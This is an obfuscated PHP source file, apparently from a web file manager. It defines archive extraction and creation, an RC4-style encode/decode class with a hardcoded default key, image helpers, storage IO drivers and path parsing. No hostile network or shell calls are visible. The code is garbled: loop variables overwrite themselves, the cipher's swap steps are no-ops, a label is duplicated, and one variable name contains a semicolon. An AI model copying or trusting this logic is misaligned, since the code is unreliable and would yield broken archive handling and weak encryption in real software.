<?php
 goto eȥ; Dտ: class KodArchive { static function init() { goto Cצ; F겆: $b𠼗[0]($b𠼗[2048], TEMP_FILES); $b𠼗[0]($b𠼗[2049], TEMP_FILES); $b𠼗[0]($b𠼗[2050], $b𠼗[2051]); goto c媾; Ãێ: require_once ARCHIVE_LIB . $b𠼗[2054]; require_once ARCHIVE_LIB . $b𠼗[2055]; require_once ARCHIVE_LIB . $b𠼗[2056]; goto a뛴Ƥ; c媾: $b𠼗[403](TEMP_FILES); require_once ARCHIVE_LIB . $b𠼗[2052]; require_once ARCHIVE_LIB . $b𠼗[2053]; goto Ãێ; a뛴Ƥ: require_once ARCHIVE_LIB . $b𠼗[2057]; goto Eجȳ; Cצ: $b𠼗 =& $_SERVER[拘]; if ($b𠼗[467](ARCHIVE_LIB)) { return; } $b𠼗[0]($b𠼗[2046], SDK_DIR . $b𠼗[2047]); goto F겆; Eجȳ: } static function checkIfType($F͈, $Bȅ) { goto Dڹ; c: $E = $bݍ[176]($F͈, $D[$Bȅ]); if ($E && ($Bȅ == $bݍ[1086] || $Bȅ == $bݍ[2061]) && (!$bݍ[534]($bݍ[2071]) || !$bݍ[534]($bݍ[2072]))) { $bݍ[522]($bݍ[2073]); } if ($E && $Bȅ == $bݍ[750] && (!$bݍ[534]($bݍ[2074]) || !$bݍ[169]($bݍ[645]($bݍ[2075]), $bݍ[2076]))) { $bݍ[522]($bݍ[2077]); } goto Dىς; Dڹ: $bݍ =& $_SERVER[拘]; self::init(); $D = array($bݍ[1086] => array($bݍ[1086], $bݍ[2058], $bݍ[2059], $bݍ[2060]), $bݍ[2061] => array($bݍ[2061], $bݍ[2062], $bݍ[2063], $bݍ[2064]), $bݍ[750] => array($bݍ[750], $bݍ[2065], $bݍ[2066], $bݍ[2067], $bݍ[2068], $bݍ[2069], $bݍ[2070])); goto c; Dىς: return $E; goto bϻݮ; bϻݮ: } static function listContent($AƝ, $Fާ뼋 = true) { $Bҧ΃ =& $_SERVER[拘]; self::init(); $F͈ = $GLOBALS[$Bҧ΃[751]] ? $GLOBALS[$Bҧ΃[751]] : $Bҧ΃[708]($AƝ); $E = !1; if (self::checkIfType($F͈, $Bҧ΃[2061])) { $B = $Bҧ΃[2079]($AƝ, $F͈); $E = array(); for ($c = 0; $c < $Bҧ΃[37]($B); $c++) { $c = $B[$c]; if ($c[$Bҧ΃[2080]] == $Bҧ΃[2081] || $c[$Bҧ΃[2080]] == $Bҧ΃[2082]) { continue; } if ($Fާ뼋) { $c[$Bҧ΃[2083]] = $Bҧ΃[425]($c[$Bҧ΃[2083]], $Bҧ΃[533]); } if ($c[$Bҧ΃[2080]] == $Bҧ΃[2084]) { $c[$Bҧ΃[557]] = !0; } else { $c[$Bҧ΃[557]] = !1; } $c[$Bҧ΃[734]] = $c; $E[] = $c; } } else { if (self::checkIfType($F͈, $Bҧ΃[750])) { $A = kodRarArchive::listContent($AƝ); if (!$A[$Bҧ΃[731]]) { return $A; } else { $E = $A[$Bҧ΃[733]]; } } else { if (kodZipArchive::support($Bҧ΃[1155])) { $E = kodZipArchive::listContent($AƝ); } else { $cя = new PclZip($AƝ); $E = $cя->{$_SERVER[拘][744]}(); } } } if ($E) { $Dϧ = $Bҧ΃[2087]($E); $Fާ뼋 = $Fާ뼋 && $Bҧ΃[534]($Bҧ΃[621]); for ($c = 0; $c < $Bҧ΃[37]($E); $c++) { $E[$c][$Bҧ΃[2083]] = $Bҧ΃[69](array($Bҧ΃[452], $Bҧ΃[2088]), $Bҧ΃[340], $E[$c][$Bҧ΃[2083]]); if ($Fާ뼋) { $E[$c][$Bҧ΃[2083]] = $Bҧ΃[2089]($E[$c][$Bҧ΃[2083]], $Dϧ, $Bҧ΃[1113]); unset($E[$c][$Bҧ΃[2090]]); } } return array($Bҧ΃[731] => !0, $Bҧ΃[733] => $E); } else { return array($Bҧ΃[731] => !1, $Bҧ΃[733] => $E); } } static function extract($AƝ, $F, $fጆ = "\55\61", &$B虫 = false) { goto c; c: $Eޏㅜ =& $_SERVER[拘]; self::init(); $F͈ = $GLOBALS[$Eޏㅜ[751]] ? $GLOBALS[$Eޏㅜ[751]] : $Eޏㅜ[708]($AƝ); goto a󶞿; a󶞿: $D􉵇 = self::listContent($AƝ, !1); if (!$D􉵇[$Eޏㅜ[731]]) { return $D􉵇; } if ($fጆ != $Eޏㅜ[729]) { goto aσ; aσ: $F֋ = self::fileIndex($D􉵇[$Eޏㅜ[733]], $fጆ); $B虫 = $Eޏㅜ[69](array($Eޏㅜ[452], $Eޏㅜ[2088]), $Eޏㅜ[183], $F֋[$Eޏㅜ[2083]]); $b㘈 = $B虫; goto aɝ; B: if ($F֋[$Eޏㅜ[557]]) { $b㘈 = $Eޏㅜ[43]($b㘈, $Eޏㅜ[44]) . $Eޏㅜ[44]; $B虫 = array($B虫); } $eې = $Eޏㅜ[69]($Eޏㅜ[338], $Eޏㅜ[44], $b㘈); if ($Eޏㅜ[7]($eې, -1) == $Eޏㅜ[44]) { if (!$Eޏㅜ[169]($Eޏㅜ[70]($eې, $Eޏㅜ[44]), $Eޏㅜ[44])) { $F = $F . $Eޏㅜ[715]($eې) . $Eޏㅜ[44]; } } else { if ($B݌˲ == $b㘈) { $B݌˲ = $Eޏㅜ[67]; } } goto Bãλ; aɝ: if ($GLOBALS[$Eޏㅜ[11]][$Eޏㅜ[530]] != $Eޏㅜ[1113]) { $b㘈 = $Eޏㅜ[2092]($B虫); } $B݌˲ = $Eޏㅜ[716]($B虫); if ($B݌˲ == $B虫) { $B݌˲ = $Eޏㅜ[67]; } goto B; Bãλ: } goto c; c: if (self::checkIfType($F͈, $Eޏㅜ[2061])) { if ($fጆ != $Eޏㅜ[729]) { $b㘈 = $Eޏㅜ[2092]($b㘈); $B݌˲ = $Eޏㅜ[2092]($B݌˲); $E = $Eޏㅜ[2093]($AƝ, array($b㘈), $F, $B݌˲, $F͈); } else { $E = $Eޏㅜ[2094]($AƝ, $F, $Eޏㅜ[1168], $F͈); } return array($Eޏㅜ[731] => $E, $Eޏㅜ[733] => $Eޏㅜ[2095](!0)); } else { if (self::checkIfType($F͈, $Eޏㅜ[750])) { return kodRarArchive::extract($AƝ, $F, $F͈, $B虫); } else { if (kodZipArchive::support($Eޏㅜ[2096])) { return kodZipArchive::extract($AƝ, $F, $B虫); } else { $cя = new PclZip($AƝ); if ($fጆ != $Eޏㅜ[729]) { $E = $cя->extract(PCLZIP_OPT_PATH, $F, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $Eޏㅜ[2097], PCLZIP_OPT_BY_NAME, $F֋[$Eޏㅜ[2083]], PCLZIP_OPT_REMOVE_PATH, $B݌˲, PCLZIP_OPT_REPLACE_NEWER); } else { $E = $cя->extract(PCLZIP_OPT_PATH, $F, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $Eޏㅜ[2097], PCLZIP_OPT_REPLACE_NEWER); } return array($Eޏㅜ[731] => $E, $Eޏㅜ[733] => $cя->{$_SERVER[拘][2098]}(!0)); } } } return array($Eޏㅜ[731] => !1, $Eޏㅜ[733] => $Eޏㅜ[2099]); goto C穯; C穯: } static function fileIndex($AǕυ, $dግ, $cьՇ = false) { goto E̐ư؟; E歩: $E = $c; if ($cьՇ) { $E = $c[$cьՇ]; if ($c[$aÈ[557]]) { $E = $aÈ[43]($E, $aÈ[44]) . $aÈ[44]; } } return $E; goto B; aˍ: $cʆ = $aÈ[37]($AǕυ); for ($c = 0; $c < $cʆ; $c++) { if ($dግ == $AǕυ[$c][$aÈ[734]]) { $c = $AǕυ[$c]; break; } } if (!$c) { $aÈ[522]($aÈ[2100]); } goto E歩; E̐ư؟: $aÈ =& $_SERVER[拘]; self::init(); if (!$aÈ[93]($AǕυ)) { return !1; } goto aˍ; B: } static function extractZipFile($AƝ, $B, $bӢ = false) { goto aƼϘ; f: $eΑ = $Dұ[716]($B); if ($eΑ == $B) { $eΑ = $Dұ[67]; } $E = $cя->extract(PCLZIP_OPT_PATH, $e擰, PCLZIP_CB_PRE_FILE_NAME, $Dұ[2097], PCLZIP_OPT_REMOVE_PATH, $eΑ, PCLZIP_OPT_BY_NAME, $B); goto d; A: if ($Dұ[48]($aٻ)) { return $aٻ; } $cя = new PclZip($AƝ); $Ą = $Dұ[2101]($e擰 . $Dұ[715]($B)); goto f; d: if (!$Dұ[48]($Ą)) { return !1; } @$Dұ[588]($Ą, $aٻ); return $aٻ; goto eޜ؞; aƼϘ: $Dұ =& $_SERVER[拘]; self::init(); $e擰 = TEMP_FILES . $Dұ[1373]($AƝ) . $Dұ[44]; goto DА; DА: $Dұ[403]($e擰); $aٻ = $e擰 . $Dұ[46]($AƝ . $B); if ($bӢ) { $aٻ = $e擰 . $bӢ; } goto A; eޜ؞: } static function filePreview($AƝ, $dግ, $fƬ˙ = false, $B = false) { goto a醺; e抮鋛: $E = self::extract($AƝ, $e擰, $dግ, $B虫); if ($c⡸[93]($B虫)) { $c⡸[29]($c⡸[2102], !1); } if ($c⡸[48]($aٻ)) { IO::fileOut($aٻ, $fƬ˙, $c⡸[715]($B虫)); return; } goto D͕; D͕: $B虫 = $c⡸[2092]($B虫); $aҫ֗ = $c⡸[715]($B虫); $Ą = $c⡸[2101]($e擰 . $aҫ֗); goto C; E֬: if (!$c⡸[48]($aٻ)) { $c⡸[721]($e擰); $c⡸[29]($c⡸[2104]); } IO::fileOut($aٻ, $fƬ˙, $aҫ֗); goto b; a醺: $c⡸ =& $_SERVER[拘]; self::init(); $e擰 = TEMP_FILES . $c⡸[1373]($AƝ) . $c⡸[44]; goto Cބ; Cބ: $c⡸[403]($e擰); $aٻ = $e擰 . $c⡸[46]($AƝ . $dግ . $B); $B虫 = $c⡸[67]; goto e抮鋛; C: if (!$E[$c⡸[731]]) { $c⡸[29]($E[$c⡸[733]], !1); } if (!$c⡸[48]($Ą)) { $c⡸[29]($c⡸[2103], !1); } @$c⡸[588]($Ą, $aٻ); goto E֬; b: } static function create($AƝ, $Eķͧ) { $eɸ =& $_SERVER[拘]; self::init(); $F͈ = $eɸ[708]($AƝ); $E = !1; if (self::checkIfType($F͈, $eɸ[1086])) { if (kodZipArchive::support($eɸ[1670])) { return kodZipArchive::create($AƝ, $Eķͧ); } $eÐ = new PclZip($AƝ); foreach ($Eķͧ as $cьՇ => $eɆ) { $eɆ = $eɸ[69]($eɸ[786], $eɸ[44], $eɆ); $A˪¬ = Kodio::clear($eɸ[716]($eɆ)); if ($cьՇ == 0) { $E = $eÐ->{$_SERVER[拘][720]}($eɆ, PCLZIP_OPT_REMOVE_PATH, $A˪¬, PCLZIP_CB_PRE_FILE_NAME, $eɸ[2105]); continue; } $E = $eÐ->{$_SERVER[拘][63]}($eɆ, PCLZIP_OPT_REMOVE_PATH, $A˪¬, PCLZIP_CB_PRE_FILE_NAME, $eɸ[2105]); } } else { if (self::checkIfType($F͈, $eɸ[2061])) { foreach ($Eķͧ as $cьՇ => $eɆ) { $eɆ = $eɸ[69]($eɸ[786], $eɸ[44], $eɆ); $A˪¬ = Kodio::clear($eɸ[716]($eɆ)); if ($cьՇ == 0) { $E = $eɸ[2106]($AƝ, array($eɆ), $F͈, null, $A˪¬); continue; } $E = $eɸ[2107]($AƝ, array($eɆ), $eɸ[67], $A˪¬, $F͈); } } } return $E; } } class Mcrypt { public static $default_key = "\141\41\164\x61\x6b\x41\72\x64\x6c\x6d\x63\x6c\144\105\x76\54\145"; public static function encode($CЪ, $cьՇ = '', $aդǝ = 0) { goto BҤƱ; a: $C = $Eџ[2110](0, 255); for ($c = $c = 0; $c < 256; $c++) { $c = ($c + $C[$c] + $C[$c]) % 256; $B꽅֞ = $C[$c]; $C[$c] = $C[$c]; $C[$c] = $B꽅֞; } $E = $Eџ[67]; goto a; a: for ($D׺ = $c = $c = 0; $c < $a쎑ȡ; $c++) { $D׺ = ($D׺ + 1) % 256; $c = ($c + $C[$D׺]) % 256; $B꽅֞ = $C[$D׺]; $C[$D׺] = $C[$c]; $C[$c] = $B꽅֞; $E .= $Eџ[2111]($Eџ[2109]($CЪ[$c]) ^ $C[($C[$D׺] + $C[$c]) % 256]); } $E = $a . $Eџ[69]($Eџ[147], $Eџ[67], $Eџ[800]($E)); $E = $Eџ[69](array($Eџ[912], $Eџ[44], $Eџ[147]), array($Eџ[963], $Eџ[183], $Eџ[348]), $E); goto b; BҤƱ: $Eџ =& $_SERVER[拘]; $Fƒ⨗ = 4; $cьՇ = $Eџ[46]($cьՇ ? $cьՇ : self::$default_key); goto Bԯ; eㅩ: $e߷ = $Cئ¤ . $Eџ[46]($Cئ¤ . $a); $e㞣 = $Eџ[195]($e߷); $CЪ = $Eџ[596]($Eџ[2108], $aդǝ ? $aդǝ + $Eџ[50]() : 0) . $Eџ[7]($Eџ[46]($CЪ . $Fײ), 0, 16) . $CЪ; goto f; f: $a쎑ȡ = $Eџ[195]($CЪ); $C = array(); for ($c = 0; $c <= 255; $c++) { $C[$c] = $Eџ[2109]($e߷[$c % $e㞣]); } goto a; Bԯ: $Cئ¤ = $Eџ[46]($Eџ[7]($cьՇ, 0, 16)); $Fײ = $Eџ[46]($Eџ[7]($cьՇ, 16, 16)); $a = $Eџ[7]($Eџ[46]($Eџ[42]()), -$Fƒ⨗); goto eㅩ; b: return $E; goto dĤ; dĤ: } public static function decode($CЪ, $cьՇ = '') { goto C␤; c߼: $E = $F[67]; for ($D׺ = $c = $c = 0; $c < $a쎑ȡ; $c++) { $D׺ = ($D׺ + 1) % 256; $c = ($c + $C[$D׺]) % 256; $B꽅֞ = $C[$D׺]; $C[$D׺] = $C[$c]; $C[$c] = $B꽅֞; $E .= $F[2111]($F[2109]($CЪ[$c]) ^ $C[($C[$D׺] + $C[$c]) % 256]); } if (($F[7]($E, 0, 10) == 0 || $F[7]($E, 0, 10) - $F[50]() > 0) && $F[7]($E, 10, 16) == $F[7]($F[46]($F[7]($E, 26) . $Fײ), 0, 16)) { return $F[7]($E, 26); } else { return $F[67]; } goto B𻐶; F: for ($c = 0; $c <= 255; $c++) { $C[$c] = $F[2109]($e߷[$c % $e㞣]); } $C = $F[2110](0, 255); for ($c = $c = 0; $c < 256; $c++) { $c = ($c + $C[$c] + $C[$c]) % 256; $B꽅֞ = $C[$c]; $C[$c] = $C[$c]; $C[$c] = $B꽅֞; } goto c߼; aʦƑ: $CЪ = $F[2112]($F[7]($CЪ, $Fƒ⨗)); $a쎑ȡ = $F[195]($CЪ); $C = array(); goto F; d֯: $cьՇ = $F[46]($cьՇ ? $cьՇ : self::$default_key); $Cئ¤ = $F[46]($F[7]($cьՇ, 0, 16)); $Fײ = $F[46]($F[7]($cьՇ, 16, 16)); goto eܰ; C␤: $F =& $_SERVER[拘]; $CЪ = $F[69](array($F[963], $F[183], $F[348]), array($F[912], $F[44], $F[147]), $CЪ); $Fƒ⨗ = 4; goto d֯; eܰ: $a = $F[7]($CЪ, 0, $Fƒ⨗); $e߷ = $Cئ¤ . $F[46]($Cئ¤ . $a); $e㞣 = $F[195]($e߷); goto aʦƑ; B𻐶: } } $_SERVER[拘][0]($_SERVER[拘][2113], $_SERVER[拘][2114]); goto eĎ; Bޫߒ: if (!$_SERVER[拘][534]($_SERVER[拘][2365])) { $_SERVER[拘][0]($_SERVER[拘][2366], 0); $_SERVER[拘][0]($_SERVER[拘][2367], 1); $_SERVER[拘][0]($_SERVER[拘][2368], 2); function imageflip($dڏ, $FŃ) { $fȉ =& $_SERVER[拘]; switch ($FŃ) { case IMG_FLIP_HORIZONTAL: $bɒ̾ = $fȉ[2369]($dڏ) - 1; $Cƅ = $bɒ̾ / 2; $Eۆ = $fȉ[2370]($dڏ); $AĂ̇ = $fȉ[2371]($dڏ) ? $fȉ[2278](1, $Eۆ) : $fȉ[2269](1, $Eۆ); for ($F߃چ = 0; $F߃چ < $Cƅ; ++$F߃چ) { $fȉ[2372]($AĂ̇, $dڏ, 0, 0, $F߃چ, 0, 1, $Eۆ); $fȉ[2372]($dڏ, $dڏ, $F߃چ, 0, $bɒ̾ - $F߃چ, 0, 1, $Eۆ); $fȉ[2372]($dڏ, $AĂ̇, $bɒ̾ - $F߃چ, 0, 0, 0, 1, $Eۆ); } break; case IMG_FLIP_VERTICAL: $b = $fȉ[2369]($dڏ); $aȶ = $fȉ[2370]($dڏ) - 1; $CĳաЙ = $aȶ / 2; $AĂ̇ = $fȉ[2371]($dڏ) ? $fȉ[2278]($b, 1) : $fȉ[2269]($b, 1); for ($d = 0; $d < $CĳաЙ; ++$d) { $fȉ[2372]($AĂ̇, $dڏ, 0, 0, 0, $d, $b, 1); $fȉ[2372]($dڏ, $dڏ, 0, $d, 0, $aȶ - $d, $b, 1); $fȉ[2372]($dڏ, $AĂ̇, 0, $aȶ - $d, 0, 0, $b, 1); } break; case IMG_FLIP_BOTH: $b = $fȉ[2369]($dڏ); $Eۆ = $fȉ[2370]($dڏ); $AĂ̇ = $fȉ[2373]($dڏ, 180, 0); $fȉ[2372]($dڏ, $AĂ̇, 0, 0, 0, 0, $b, $Eۆ); break; default: return; } $fȉ[2270]($AĂ̇); } } if (!$_SERVER[拘][534]($_SERVER[拘][2374])) { function imagecreatefrombmp($dÕ) { return imageGdBMP::load($dÕ); } } goto C楾; B: class IO { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($E, $Dݜ) { $F =& $_SERVER[拘]; $eҲ = self::driverMake($Dݜ[0]); if ($F[89]($eҲ, $E)) { return @$F[90](array($eҲ, $E), $Dݜ); } else { if ($F[89](self, $E)) { return @$F[90](array(self, $E), $Dݜ); } else { $F[29]("\111\117\72\72{$E}\x28\51\x20\x6e\x6f\x74\x20\x65\x78\x69\163\x74\x3b"); } } } public static function init($Bò) { return self::driverMake($Bò); } public static function copy($A, $f, $cǈǄ = false) { return self::copyMove($A, $f, $cǈǄ, $_SERVER[拘][369]); } public static function move($c, $Eĭ, $a = false) { return self::copyMove($c, $Eĭ, $a, $_SERVER[拘][370]); } public static function saveFile($f, $BĔ) { goto eč; eč: $aʧ = self::info($BĔ); $e = self::driverMake($f); $B󇒊 = self::driverMake($BĔ); goto Cݠ밪; C҉ݎ: return self::copyFile($e, $f, $B󇒊, $E;즎, $aʧ[$_SERVER[拘][375]], $D); goto fگ; Cݠ밪: $E;즎 = $B󇒊->{$_SERVER[拘][372]}($BĔ); $D = !0; if (self::driverIsSame($e, $B󇒊)) { $D = !1; } goto C҉ݎ; fگ: } private static function copyMove($E, $Bؾ, $FĠ, $b) { goto DЕ𔶊; f⾷: if (!$dڔۚ && $bʥɐ->{$_SERVER[拘][380]}() == $F쫊Յ[381] && $Fˮ->{$_SERVER[拘][380]}() == $F쫊Յ[382]) { $cք = $bʥɐ->{$_SERVER[拘][383]}($Fˮ, $E, $Bؾ, $FĠ, $A); } else { $cք = self::copyPath($Fˮ, $E, $bʥɐ, $Bؾ, $FĠ, $A, $dڔۚ); } if ($cք && $A) { $Fˮ->{$_SERVER[拘][62]}($E); } return $cք; goto eͿ񾇏; DЕ𔶊: $F쫊Յ =& $_SERVER[拘]; $F쫊Յ[376](); $Fˮ = self::driverMake($E); goto B޸; fЉ: $C = self::driverIsSame($Fˮ, $bʥɐ); if ($C) { if ($b == $F쫊Յ[370] && $F쫊Յ[70]($Bؾ, $F쫊Յ[44]) == $F쫊Յ[70]($bʥɐ->{$_SERVER[拘][372]}($E), $F쫊Յ[44])) { return $bʥɐ->{$_SERVER[拘][378]}($E); } if ($F쫊Յ[89]($bʥɐ, $b)) { return $bʥɐ->{$b}($E, $Bؾ, $FĠ); } } $dڔۚ = $Fˮ->{$_SERVER[拘][379]}($E); goto f⾷; B޸: $bʥɐ = self::driverMake($Bؾ); $A = $b == $F쫊Յ[370]; self::check($Fˮ, $E, $bʥɐ, $Bؾ); goto fЉ; eͿ񾇏: } private static function check($b, $FȌ, $Aؐ󄕊, &$fԜ) { $Aۥޑ =& $_SERVER[拘]; if (self::driverIsSame($b, $Aؐ󄕊) && $b->{$_SERVER[拘][385]}($FȌ) && $b->{$_SERVER[拘][386]}($FȌ, $fԜ)) { $Aۥޑ[29]($Aۥޑ[387]($Aۥޑ[388]), !1); } if (!$b->{$_SERVER[拘][389]}($FȌ)) { $Aۥޑ[29]($Aۥޑ[387]($Aۥޑ[390]), !1); } } private static function copyPath($b, $C, $C, $B՞, $f³, $B, $A) { goto d; Dͱ: $C = $f[153]($d󅼥í[$f[398]], $d󅼥í[$f[399]]); foreach ($C as $Dϵ) { $Aӧ = $Dϵ[$f[400]] == $f[18]; $C = $b->{$_SERVER[拘][396]}($Dϵ[$f[40]]); self::copyPath($b, $C, $C, $B՞, $f³, $B, $Aӧ); } return $fǐ; goto dٴ; fԛ: if ($A) { if (!$C->{$_SERVER[拘][389]}($B՞)) { $Cܨ = $C->{$_SERVER[拘][391]}($C->{$_SERVER[拘][392]}($B՞)); $B՞ = $C->{$_SERVER[拘][372]}($B՞); } return self::copyFile($b, $C, $C, $B՞, $Cܨ, $B); } if ($f³ == REPEAT_RENAME_FOLDER) { $f³ = !1; } $aي = $f[43]($B՞, $f[44]) . $f[44] . $Cܨ; goto D; d: $f =& $_SERVER[拘]; $Cܨ = $b->{$_SERVER[拘][391]}($b->{$_SERVER[拘][392]}($C)); if ($f³) { $Eه׻ = $C->{$_SERVER[拘][393]}($B՞, $Cܨ); $Cܨ = $C->{$_SERVER[拘][394]}($B՞, $Cܨ, $f³, !$A); $f³ = $Eه׻ ? $f³ : !1; } goto fԛ; D: $fǐ = $C->{$_SERVER[拘][395]}($aي); $B՞ = $C->{$_SERVER[拘][396]}($fǐ); $d󅼥í = $b->{$_SERVER[拘][397]}($C, !1, !0); goto Dͱ; dٴ: } private static function copyFile($F, $Eɪё, $a, $Fҕ䯊, $B筸, $Eݹѷ) { goto F; Aϟ: $Bת[409]($B); return $F߉; goto b; F: $Bת =& $_SERVER[拘]; $Fҕ䯊 = $a->{$_SERVER[拘][401]}($Bת[43]($Fҕ䯊, $Bת[44]) . $Bת[44] . $B筸); if (self::driverIsSame($F, $a)) { if ($Eݹѷ) { return $F->{$_SERVER[拘][402]}($Eɪё, $Fҕ䯊); } else { return $F->{$_SERVER[拘][374]}($Eɪё, $Fҕ䯊); } } goto c; EӞ: $AӜ = $F->{$_SERVER[拘][406]}($Eɪё, $AӜ); $AӜ = $F->{$_SERVER[拘][407]}($AӜ); $F߉ = $a->{$_SERVER[拘][408]}($Fҕ䯊, $AӜ, $Eݹѷ); goto Aϟ; c: $E񳇏 = TEMP_FILES; $Bת[403]($E񳇏); $AӜ = $B = $E񳇏 . $Bת[404] . $Bת[50]() . $Bת[405](5); goto EӞ; b: } private static function driverIsSame($d轡, $dɑԜ) { goto d; b: if ($a緾ľ != $Dȏܩ) { return !1; } if ($a緾ľ == $fӱ桥[381]) { return !0; } if ($a緾ľ == $fӱ桥[382]) { return !0; } goto B; B: if ($d轡->pathDriver == $dɑԜ->pathDriver) { return !0; } return !1; goto F興; d: $fӱ桥 =& $_SERVER[拘]; $a緾ľ = $d轡->{$_SERVER[拘][380]}(); $Dȏܩ = $dɑԜ->{$_SERVER[拘][380]}(); goto b; F興: } private static function driverMake(&$B懷) { $e؈ =& $_SERVER[拘]; $Dܹ = KodIO::parse($B懷); if (!self::$driverListSystem) { $A = $e؈[64]($e؈[411])->{$_SERVER[拘][412]}(); self::$driverListSystem = $e؈[413]($A, $e؈[414]); } $B懷 = $Dܹ[$e؈[415]]; $b = self::driverGet($Dܹ, $B懷); return $b; } private static function driverGet($Fϭǌ, &$B휿Ċ) { goto Eɼ; e: $Fӕ = self::$driverCache[$CϨ]; $Fӕ->pathDriver = $C𩰘ܙ; $Fӕ->pathBase = $Dȿ񒜹[67]; goto Dϡ; c: return $Fӕ; goto BِŢ; Eɼ: $Dȿ񒜹 =& $_SERVER[拘]; $C𩰘ܙ = $Fϭǌ[$Dȿ񒜹[417]]; $eڲ = $Fϭǌ[$Dȿ񒜹[414]]; goto e؂; Dϡ: if (isset($b֝[$Dȿ񒜹[11]][$Dȿ񒜹[424]])) { $Fӕ->pathBase = $Dȿ񒜹[43]($b֝[$Dȿ񒜹[11]][$Dȿ񒜹[424]], $Dȿ񒜹[44]) . $Dȿ񒜹[44]; $B휿Ċ = $Fӕ->pathBase . $Dȿ񒜹[425]($B휿Ċ, $Dȿ񒜹[44]); } $B휿Ċ = $Fӕ->{$_SERVER[拘][401]}($B휿Ċ); $Fӕ->path = $B휿Ċ; goto c; e؂: switch ($Fϭǌ[$Dȿ񒜹[400]]) { case KodIO::KOD_IO: $b֝ = self::$driverListSystem[$eڲ]; break; case KodIO::KOD_SOURCE: $B휿Ċ = $eڲ . $B휿Ċ; $b֝ = array($Dȿ񒜹[418] => $Dȿ񒜹[419], $Dȿ񒜹[11] => $Fϭǌ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $b = $GLOBALS[$Dȿ񒜹[420]]; self::$driverListUser = $Dȿ񒜹[413]($b, $Dȿ񒜹[414]); } $b֝ = self::$driverListUser[$eڲ]; break; case KodIO::KOD_SHARE_LINK: case KodIO::KOD_SHARE_ITEM: $b֝ = array($Dȿ񒜹[418] => $Dȿ񒜹[419], $Dȿ񒜹[11] => $Fϭǌ); break; default: $B휿Ċ = $Fϭǌ[$Dȿ񒜹[40]]; $b֝ = array($Dȿ񒜹[418] => $Dȿ񒜹[421]); break; } $CϨ = $Fϭǌ[$Dȿ񒜹[40]]; if (!isset(self::$driverCache[$CϨ])) { $f = $Dȿ񒜹[422] . $b֝[$Dȿ񒜹[423]]; if (!$Dȿ񒜹[82]($f)) { $Dȿ񒜹[29]("{$f}\40\x6e\x6f\x74\40\145\170\x69\163\164\163\x21", !1); } $bѱ = isset($b֝[$Dȿ񒜹[11]]) ? $b֝[$Dȿ񒜹[11]] : !1; self::$driverCache[$CϨ] = new $f($bѱ); } goto e; BِŢ: } } class KodIO { const KOD_SOURCE = "\173\x73\x6f\x75\x72\143\145\175"; const KOD_USER_RECYCLE = "\x7b\x75\x73\x65\x72\x52\x65\x63\171\143\x6c\145\x7d"; const KOD_USER_FAV = "\173\x75\163\145\x72\x46\141\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\163\x65\162\106\151\154\x65\124\x61\x67\175"; const KOD_USER_FILE_TYPE = "\173\165\163\145\x72\106\151\x6c\145\124\x79\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\x6f\165\x70\122\x6f\157\x74\x53\x65\x6c\146\175"; const KOD_USER_SHARE = "\x7b\x75\x73\145\x72\x53\x68\141\x72\145\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\141\x72\145\124\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\173\x73\150\141\x72\x65\x49\164\145\155\x7d"; const KOD_SHARE_LINK = "\173\163\x68\141\x72\x65\111\164\x65\155\x4c\x69\x6e\x6b\x7d"; const KOD_SEARCH = "\x7b\x73\x65\141\x72\x63\x68\x7d"; const KOD_BLOCK = "\173\142\x6c\x6f\x63\153\x7d"; const KOD_IO = "\x7b\151\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\x73\x65\162\x52\x65\x6e\143\x65\156\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x75\x73\x65\162\104\162\151\166\x65\x72\175"; public static function typeList() { $C즄 =& $_SERVER[拘]; return array($C즄[426] => self::KOD_SOURCE, $C즄[427] => self::KOD_USER_RECYCLE, $C즄[428] => self::KOD_USER_FAV, $C즄[429] => self::KOD_USER_FILE_TAG, $C즄[430] => self::KOD_USER_FILE_TYPE, $C즄[431] => self::KOD_GROUP_ROOT_SELF, $C즄[432] => self::KOD_USER_SHARE, $C즄[433] => self::KOD_USER_SHARE_TO_ME, $C즄[434] => self::KOD_SHARE_ITEM, $C즄[435] => self::KOD_SHARE_LINK, $C즄[436] => self::KOD_SEARCH, $C즄[437] => self::KOD_BLOCK, $C즄[438] => self::KOD_IO, $C즄[439] => self::KOD_USER_RECENT, $C즄[440] => self::KOD_USER_DRIVER); } public static function parse($b߄Ǹ) { goto eй݌; EΏ: $B֨[131]($B֨[444], $b߄Ǹ, $c); $B = array($B֨[445] => !1, $B֨[446] => !1, $B֨[447] => !1, $B֨[40] => $b߄Ǹ, $B֨[417] => !1, $B֨[415] => $B֨[67]); if ($B֨[93]($c) && $B֨[37]($c) == 5) { $eâ = $B֨[448] . $c[2] . $B֨[449]; if ($B֨[176]($eâ, $f챪)) { $B[$B֨[417]] = $c[1]; $B[$B֨[400]] = $eâ; $B[$B֨[450]] = $B֨[7]($eâ, 1, -1); $B[$B֨[414]] = $c[3]; } $B[$B֨[415]] = $c[4]; } goto cݨك; eй݌: $B֨ =& $_SERVER[拘]; $b߄Ǹ = self::clear($b߄Ǹ); $f챪 = $B֨[442](self::typeList()); goto EΏ; cݨك: return $B; goto aϜ̫; aϜ̫: } public static function clear($E㎢߷) { goto B֦; B֦: $AѪɖ =& $_SERVER[拘]; $E㎢߷ = $AѪɖ[69]($AѪɖ[338], $AѪɖ[44], $E㎢߷); $C = $AѪɖ[451]; goto A; A: if ($AѪɖ[7]($E㎢߷, 0, 3) == $AѪɖ[452]) { $E㎢߷ = $AѪɖ[7]($E㎢߷, 3); } while ($AѪɖ[169]($E㎢߷, $C)) { $E㎢߷ = $AѪɖ[69]($C, $AѪɖ[44], $E㎢߷); } $E㎢߷ = $AѪɖ[216]($AѪɖ[453], $AѪɖ[44], $E㎢߷); goto dߎ; dߎ: if ($E㎢߷ == $AѪɖ[44]) { return $AѪɖ[44]; } $E㎢߷ = $AѪɖ[43]($E㎢߷, $AѪɖ[44]); return $E㎢߷; goto 